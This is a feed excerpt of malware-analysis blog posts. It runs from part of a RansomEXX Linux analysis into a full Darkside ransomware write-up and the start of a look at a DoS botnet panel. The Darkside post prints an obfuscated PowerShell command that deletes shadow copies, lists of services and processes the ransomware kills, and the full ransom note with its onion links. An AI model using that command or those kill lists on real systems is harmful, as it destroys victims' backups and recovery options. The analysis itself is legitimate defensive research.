&lt;p&gt;So let’s go through the main functionality of this sample and start with main function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image1.png&quot; alt=&quot;main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function named &lt;strong&gt;GeneratePreData()&lt;/strong&gt;  generates the 256 bit AES key and also encrypts it using RSA.&lt;/p&gt;

&lt;p&gt;Generating a random AES key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image2.png&quot; alt=&quot;AES key generation&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Importing the RSA key and encrypting the AES key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image3.png&quot; alt=&quot;RSA key import and encryption&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, this function saves both the AES key and encrypted AES key to global variables. This way the workers responsible for the encryption can access this data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image4.png&quot; alt=&quot;Global Variables&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ransomware uses a mutex while accessing or writing to the global variables. This way the ransomware guarantees that no workers are accessing the global variables while the key is being changed and that the key is not changed when the workers are encrypting files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image5.png&quot; alt=&quot;Mutex&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Right after generating the keys the ransomware creates a new thread:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image6.png&quot; alt=&quot;New Thread&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This new thread will generate a new AES key every 0.18 seconds. This way the ransomware ensures that all the files aren’t encrypted with the same AES key.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image7.png&quot; alt=&quot;Updating the keys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is important to notice that the ransomware expects the paths for file encryption to be passed as arguments:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image8.png&quot; alt=&quot;Parsing Argv&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function &lt;strong&gt;EnumFiles()&lt;/strong&gt; takes a path as an argument and it will:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initialize the workers (threads) for file encryption.&lt;/li&gt;
  &lt;li&gt;Recursively search the directory for files by calling &lt;strong&gt;list_dir()&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The function &lt;strong&gt;list_dir()&lt;/strong&gt; creates a ransomnote inside the current directory (where the search starts) by calling &lt;strong&gt;ReadMeStoreForDir()&lt;/strong&gt; and it starts searching for files.&lt;/p&gt;

&lt;p&gt;If a new file is found and it’s not either the ransom note or an already encrypted file it will then be added to the workers “queue” in memory by calling &lt;strong&gt;add_task_to_worker()&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If a directory is found and it’s not either “.” or “..” then the function calls itself again but this time with a new directory to search, and so on…&lt;/p&gt;

&lt;p&gt;The following image shows exactly how this logic is implemented:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image9.png&quot; alt=&quot;Traversing directories&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The workers use AES in ECB mode to encrypt the files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image10.png&quot; alt=&quot;AES encryption&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;ransomnote&quot;&gt;Ransomnote&lt;/h1&gt;

&lt;p&gt;The ransomnote is written to a file with following name structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!NEWS_FOR_&amp;lt;COMPANY&amp;gt;!.txt&lt;/code&gt;. As seen, this sample was designed for &lt;a href=&quot;https://www.eigsi.fr/&quot;&gt;EIGS&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ransomexx_linux/image11.png&quot; alt=&quot;Ransomnote&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Ransomware is nasty but it can be profitable for the threat actors and not even Linux is safe from this kind of threats. The best way to prevent this kind of threat is to always be prepared for it.&lt;/p&gt;

&lt;p&gt;SHA256:&lt;/p&gt;

&lt;p&gt;CB408D45762A628872FA782109E8FCFC3A5BF456074B007DE21E9331BB3C5849&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">In this blog point I will go through a Linux sample of the ransomware family RansomEXX (aka Defray777). This ransomware group did some big attacks during 2020 and only Windows samples were known until Kaspersky revealed that the group also had a Linux build.</summary></entry><entry><title type="html">Darkside Ransomware</title><link href="http://blog.reversing.xyz/darkside.html" rel="alternate" type="text/html" title="Darkside Ransomware" /><published>2020-12-06T00:00:00+00:00</published><updated>2020-12-06T00:00:00+00:00</updated><id>http://blog.reversing.xyz/darkside</id><content type="html" xml:base="http://blog.reversing.xyz/darkside.html">&lt;p&gt;In this blog post I’ll go through a Darkside ransomware sample and try to explain its main functionalities based on my research.&lt;/p&gt;

&lt;p&gt;About the ransomware operation:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A new ransomware operation named DarkSide began attacking organizations earlier this month with customized attacks that have already earned them million-dollar payouts.&lt;/p&gt;

  &lt;p&gt;Starting around August 10th, 2020, the new ransomware operation began performing targeted attacks against numerous companies.&lt;/p&gt;

  &lt;p&gt;In a “press release” issued by the threat actors, they claim to be former affiliates who had made millions of dollars working with other ransomware operations.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms&quot;&gt;Bleeping Computer&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This ransomware group claims that they will not attack Medicine, Education, Non-profit organizations and the Gov sector. &lt;img src=&quot;/assets/images/malware_analysis/darkside/1.png&quot; alt=&quot;image-20201207141636804&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also the group claims that they are creating a sustainable distributed storage infrastructure based in Iran to leak their victims data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/2.png&quot; alt=&quot;image-20201207141817129&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;building-the-imports&quot;&gt;Building the imports&lt;/h2&gt;

&lt;p&gt;To make the analysis a bit harder Darkside resolves the needed apis dynamically. If we check the imports of the sample we find only a few referenced apis:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/3.png&quot; alt=&quot;image-20201206182515829&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The strings/data are encrypted and after reversing the decryption algorithm and fixing my IDB file with all the decrypted strings the analysis got much easier. The following strings refer to the dlls and apis that Darkside loads and resolves during execution:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ntdll
_wcsicmp
wcscpy
wcscat
wcsstr
wcsrchr
wcslen
_wcslwr
swprintf
RtlInitUnicodeString
LdrEnumerateLoadedModules
RtlRandomEx
RtlComputeCrc32
_allshr
_alldiv
_allmul
NtQuerySystemInformation
NtQueryInformationFile
NtQueryInformationProcess
strlen
RtlGetVersion
RtlWow64EnableFsRedirectionEx
kernel32
LoadLibraryA
FreeLibrary
CreateFileW
CreateProcessW
CreateThread
ReadFile
WriteFile
GetFileSize
CloseHandle
OpenMutexW
CreateMutexW
GetUserDefaultLangID
GetSystemDefaultUILanguage
GetCommandLineW
GetModuleFileNameW
GetShortPathNameW
GetEnvironmentVariableW
GetWindowsDirectoryW
InitializeCriticalSection
EnterCriticalSection
LeaveCriticalSection
DeleteCriticalSection
CreateIoCompletionPort
GetQueuedCompletionStatus
PostQueuedCompletionStatus
OpenProcess
CreateToolhelp32Snapshot
Process32FirstW
Process32NextW
SetFileAttributesW
GetLogicalDriveStringsW
GetDriveTypeW
WaitForSingleObject
GetSystemDirectoryW
IsWow64Process
TerminateProcess
Wow64DisableWow64FsRedirection
Wow64RevertWow64FsRedirection
SetThreadExecutionState
GetNativeSystemInfo
HeapAlloc
HeapReAlloc
HeapFree
GetProcessHeap
FindFirstFileExW
FindNextFileW
FindClose
Sleep
MoveFileExW
WaitForMultipleObjects
SetFilePointerEx
InterlockedIncrement
GetCurrentProcessId
DuplicateHandle
TerminateThread
GetExitCodeThread
RemoveDirectoryW
DeleteFileW
WideCharToMultiByte
GetCurrentDirectoryW
SetCurrentDirectoryW
advapi32
OpenProcessToken
DuplicateTokenEx
ImpersonateLoggedOnUser
GetTokenInformation
LookupAccountSidW
AdjustTokenPrivileges
OpenSCManagerW
EnumServicesStatusExW
OpenServiceW
ControlService
DeleteService
CloseServiceHandle
GetNamedSecurityInfoW
SetNamedSecurityInfoW
SetEntriesInAclW
RegOpenKeyExW
RegCreateKeyExW
RegSetValueExW
RegCloseKey
RegDeleteValueW
RegFlushKey
shell32
CommandLineToArgvW
ShellExecuteW
IsUserAnAdmin
ShellExecuteExW
ole32
CoInitialize
CoUninitialize
CoGetObject
CoInitializeSecurity
CoCreateInstance
CoSetProxyBlanket
oleaut32
VariantClear
mpr
WNetOpenEnumW
WNetEnumResourceW
WNetCloseEnum
iphlpapi
GetAdaptersInfo
shlwapi
PathIsDirectoryW
PathIsDirectoryEmptyW
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After resolving the necessary apis, the ransomware parses its own config and prepares to start the encryption routines.&lt;/p&gt;

&lt;h2 id=&quot;messing-with-the-process-access-token&quot;&gt;Messing with the process access token&lt;/h2&gt;

&lt;p&gt;Darkside tries to adjust it’s own process access token privileges and to impersonate the logged on user.&lt;/p&gt;

&lt;p&gt;Adjusting it’s own token privileges:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/4.png&quot; alt=&quot;image-20201206185218611&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Impersonating the logged on user:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/5.png&quot; alt=&quot;image-20201206185456059&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;mutex&quot;&gt;Mutex&lt;/h2&gt;

&lt;p&gt;To ensure that only one instance of the ransomware is running the following mutex is created:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLOBAL\\&amp;lt;FILENAME&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The mutex name is based on the filename of the executable and if the mutex already exists the execution is aborted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/6.png&quot; alt=&quot;image-20201206190311350&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;darkside-actions&quot;&gt;Darkside actions&lt;/h2&gt;

&lt;p&gt;The following list refers to the main actions performed by Darkside on the system:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;System Language Check
Emptying Recycle Bin
Uninstalling Services
Deleting Shadow Copies
Terminating Processes
Encrypting Local Disks
Encrypting Network Shares
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;system-language-check&quot;&gt;System Language Check&lt;/h2&gt;

&lt;p&gt;Darkside checks the system language using the &lt;strong&gt;GetSystemDefaultUILanguage&lt;/strong&gt; and &lt;strong&gt;GetUserDefaultLangID&lt;/strong&gt; apis:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/7.png&quot; alt=&quot;image-20201206191911990&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the following decrypted string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;This is a Russian-Speaking System, Exit&lt;/code&gt; we can already guess that this ransomware whitelisted Russian speaking users. CIS countries are whitelisted by this ransomware.&lt;/p&gt;

&lt;h2 id=&quot;uninstalling-services&quot;&gt;Uninstalling Services&lt;/h2&gt;

&lt;p&gt;Darkside takes a list of services from its own configuration and uninstalls them using the &lt;strong&gt;DeleteService&lt;/strong&gt; api:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/8.png&quot; alt=&quot;image-20201206192511100&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of services to uninstall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vss
sql
svc$
memtas
mepocs
sophos
veeam
backup
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;deleting-shadow-copies&quot;&gt;Deleting Shadow Copies&lt;/h2&gt;

&lt;p&gt;Darkside uses two different approaches to delete the shadow copies of windows. If it’s a Wow64 process (meaning 32 bit application running on a 64 bit machine) it uses powershell. If it’s a 32 bit machine it uses COM + WMI to delete them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/9.png&quot; alt=&quot;image-20201206193244693&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;64-bit-machine&quot;&gt;64 bit machine&lt;/h4&gt;

&lt;p&gt;For 64 bit machines Darkside simply calls &lt;strong&gt;CreateProcessW&lt;/strong&gt; to run a decrypted powershell command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/10.png&quot; alt=&quot;image-20201206193621423&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Powershell command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -ep bypass -c &quot;(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Decoded powershell command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;32-bit-machine&quot;&gt;32 bit machine&lt;/h4&gt;

&lt;p&gt;For 32 bit machines Darkside uses COM interface to execute a WQL query to delete the shadow copies.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/11.png&quot; alt=&quot;image-20201207101905825&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;terminating-processes&quot;&gt;Terminating Processes&lt;/h2&gt;

&lt;p&gt;Darkside takes a list of processes from its own configuration and terminates them using the &lt;strong&gt;TerminateProcess&lt;/strong&gt; api:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/darkside/12.png&quot; alt=&quot;image-20201207104323828&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of processes to terminate:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sql
oracle
ocssd
dbsnmp
synctime
agntsvc
isqlplussvc
xfssvccon
mydesktopservice
ocautoupds
encsvc
firefox
tbirdconfig
mydesktopqos
ocomm
dbeng50
sqbcoreservice
excel
infopath
msaccess
mspub
onenote
outlook
powerpnt
steam
thebat
thunderbird
visio
winword
wordpad
notepad
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Darkside also parses from its own config the following list of processes to avoid terminating them:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vmcompute.exe
vmms.exe
vmwp.exe
svchost.exe
TeamViewer.exe
explorer.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;encryption&quot;&gt;Encryption&lt;/h2&gt;

&lt;p&gt;For encryption this ransomware uses SALSA20 to encrypt the files and a RSA to encrypt the salsa key. The file extension of the encrypted files is a checksum of the victims MAC address.&lt;/p&gt;

&lt;p&gt;Darkside also parses a list of files, extensions and directories from its own configuration and skips them in the encryption routines.&lt;/p&gt;

&lt;p&gt;List of whitelisted files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;autorun.inf
boot.ini
bootfont.bin
bootsect.bak
desktop.ini
iconcache.db
ntldr
ntuser.dat
ntuser.dat.log
ntuser.ini
thumbs.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;List of whitelisted directories:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$recycle.bin
config.msi
$windows.~bt
$windows.~ws
windows
appdata
application data
boot
google
mozilla
program files
program files (x86)
programdata
system volume information
tor browser
windows.old
intel
msocache
perflogs
x64dbg
public
all users
default
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;List of whitelisted extensions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;386
adv
ani
bat
bin
cab
cmd
com
cpl
cur
deskthemepack
diagcab
diagcfg
diagpkg
dll
drv
exe
hlp
icl
icns
ico
ics
idx
ldf
lnk
mod
mpa
msc
msp
msstyles
msu
nls
nomedia
ocx
prf
ps1
rom
rtp
scr
shs
spl
sys
theme
themepack
wpx
lock
key
hta
msi
pdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ransomnote&quot;&gt;Ransomnote&lt;/h2&gt;

&lt;p&gt;The following ransomnote is also part of the ransomware configuration and it’s written to a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README.&amp;lt;CHECKSUM MAC ADDRESS&amp;gt;.TXT&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;----------- [ Welcome to Dark ] -------------&amp;gt;

What happend?
----------------------------------------------
Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data.
But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network.
Follow our instructions below and you will recover all your data.

Data leak
----------------------------------------------
First of all we have uploaded more then 100 GB data.

Example of data:
 - Accounting data
 - Executive data
 - Sales data
 - Customer Support data
 - Marketing data
 - Quality data
 - And more other...

Your personal leak page: http://darksidedxcftmqa.onion/blog/article/id/6/dQDclB_6Kg-c-6fJesONyHoaKh9BtI8j9Wkw2inG8O72jWaOcKbrxMWbPfKrUbHC
The data is preloaded and will be automatically published if you do not pay.
After publication, your data will be available for at least 6 months on our tor cdn servers.

We are ready:
- To provide you the evidence of stolen data
- To give you universal decrypting tool for all encrypted files.
- To delete all the stolen data.

What guarantees?
----------------------------------------------
We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
We guarantee to decrypt one file for free. Go to the site and contact us.

How to get access on website? 
----------------------------------------------
Using a TOR browser:
1) Download and install TOR browser from this site: 
http://torproject.org/
2) Open our website: http://darksidfqzcuhtk2.onion/K71D6P88YTX04R3ISCJZHMD5IYV55V9247QHJY0HJYUXX68H2P05XPRIR5SP2U68

When you open our website, put the following data in the input form:
Key:
pr9gzRnMz6qEwr6ovMT0cbjd9yT56NctfQZGIiVVLgo0ME2EQpAUyZucG9BLrOJjno5XLPvCN11TFfnlFHa42u5mJxoeR5k5RUgQAC1MC6LBUj4YOOAUyiBrR
HQSUM3pzGoEPRVOzXSZ8YqkJyFL0TDFBbWaBKQDOSo9GzKKoVRQ0Eb02F5geTPkTAqZZSfSQ6PBBlTGPSgGe2kCyuwwp7lDmRSJlNnHssMMZHVhXzyZ6fxiBY
gNiuusFK8JNI5nrtRPp3bMAc6OEddxfJWj6o2GT1Xg9j87Jp4Oyv43E1J61jLJAWBkmoBB3Gqv07mtyDW5PnmxBlNzABbLFEvJMQL23sR8nnw4svzcZHxrqD1
xRcxqyeKtsaQ5yqLvyQgMdnrI2QoCqkHYYUfBIzjO8BXyBZdmjHanXE57jdDAhjaDUUqfL917cCyJr1uwVR0Xj5lJXe8BIKHd3dFrz70CsIXFAhicOsBlFzIn
daNcAXXyL8Fg1avIXOcuEkGRDXt8Cs8b3TAB6n4DrbLJdiFjECo8yCA9pxvzqjXatumUloblWFZaUoLVYzP

!!! DANGER !!!
DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. 
!!! DANGER !!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;debugging-logs&quot;&gt;Debugging logs&lt;/h2&gt;

&lt;p&gt;For some reason the authors left the capability of writing debug logs as the sample creates a log file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOG.&amp;lt;CHECKSUM MAC ADDRESS&amp;gt;.TXT&lt;/code&gt; with the following contents:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INF] Start Encrypting All Files 
[INF] Emptying Recycle Bin 
[INF] Uninstalling Services 
[INF] Deleting Shadow Copies 
[INF] Terminating Processes 
[INF] Encrypt Mode - FAST 
[INF] Encrypting Local Disks 
[INF] Started 2 I/O Workers 
[INF] Encrypted 0 file(s) 
[INF] Encrypting Network Shares 
[INF] Started 2 I/O Workers 
[INF] Encrypted 0 file(s) 
[INF] Started 2 I/O Workers 
[INF] Encrypted 0 file(s) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;iocs&quot;&gt;IOCs&lt;/h2&gt;

&lt;p&gt;SHA256&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1667e1635736f2b2ba9727457f995a67201ddcd818496c9296713ffa18e17a43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more samples of Darkside visit &lt;a href=&quot;https://bazaar.abuse.ch/browse.php?search=tag%3ADarkside&quot;&gt;malware bazaar&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms&quot;&gt;https://www.bleepingcomputer.com/news/security/darkside-new-targeted-ransomware-demands-million-dollar-ransoms&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bleepingcomputer.com/news/security/darkside-ransomware-is-creating-a-secure-data-leak-service-in-iran/&quot;&gt;https://www.bleepingcomputer.com/news/security/darkside-ransomware-is-creating-a-secure-data-leak-service-in-iran/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://zawadidone.nl/2020/10/05/darkside-ransomware-analysis.html&quot;&gt;https://zawadidone.nl/2020/10/05/darkside-ransomware-analysis.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">In this blog post I’ll go through a Darkside ransomware sample and try to explain its main functionalities based on my research.</summary></entry><entry><title type="html">Looking into a random blue botnet panel</title><link href="http://blog.reversing.xyz/random-blue-botnet-panel.html" rel="alternate" type="text/html" title="Looking into a random blue botnet panel" /><published>2020-12-02T00:00:00+00:00</published><updated>2020-12-02T00:00:00+00:00</updated><id>http://blog.reversing.xyz/random_blue_botnet_panel</id><content type="html" xml:base="http://blog.reversing.xyz/random-blue-botnet-panel.html">&lt;h2 id=&quot;panel-overview&quot;&gt;Panel Overview&lt;/h2&gt;

&lt;p&gt;When we visit the page we are presented with a directory listing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129192311489.png&quot; alt=&quot;image-20201129192311489&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see a zip with the panel, some samples, some php files and a txt file. There are two panels in the server and If we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newbot&lt;/code&gt; directory or to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOTNET_HOST/newbot/&lt;/code&gt; we are presented with the same panel login page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129192548260.png&quot; alt=&quot;image-20201129192548260&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found that this was a blue botnet panel after looking into one of the samples. The next section of this blog post will be about the blue bot sample.&lt;/p&gt;

&lt;p&gt;Comparing the source code of this panel with a leaked version of the blue botnet original panel we can see that only the titles and labels were changed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129192745455.png&quot; alt=&quot;image-20201129192745455&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The languange of the new titles and labels is Vietnamese, thus this can be a good lead on the origin of the actor behind the panels.&lt;/p&gt;

&lt;p&gt;The panel is not very sophisticated as it doesn’t even use a sql database in the backend, it’s all based on files present in the root of the panel.&lt;/p&gt;

&lt;p&gt;The bots are registered in a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;visitors.txt&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129193328583.png&quot; alt=&quot;image-20201129193328583&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Only the first panel &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hxxp://158.247.208.239/newbot/visitors.txt&lt;/code&gt; have bots registered:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129193635904.png&quot; alt=&quot;image-20201129193635904&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The bots are registered based on who visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;botlogger.php&lt;/code&gt; file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129194934849.png&quot; alt=&quot;image-20201129194934849&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The panel will register everyone who visits that page as a bot and the registration is simply based on the remote IP and the timestamp. Based on this, we cannot be 100% sure if every IP address registered on this panel is a bot, since any crawler, scanner, sandbox or curious person who visits that php file will get registered as a bot :(&lt;/p&gt;

&lt;p&gt;This is a DoS botnet and the panel maintains a list of targets written to the following files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target
target.ip
target.method
target.port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; file as it’s basically a formatted string based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target.ip&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target.method&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target.port&lt;/code&gt; files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129194213108.png&quot; alt=&quot;image-20201129194213108&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Inside the panel&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The panel if really simple as it’s only possible to define new targets and see the registered bots.&lt;/p&gt;

&lt;p&gt;Define new targets:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201201132330068.png&quot; alt=&quot;image-20201201132330068&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bots:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201201132350165.png&quot; alt=&quot;image-20201201132350165&quot; /&gt;&lt;/p&gt;

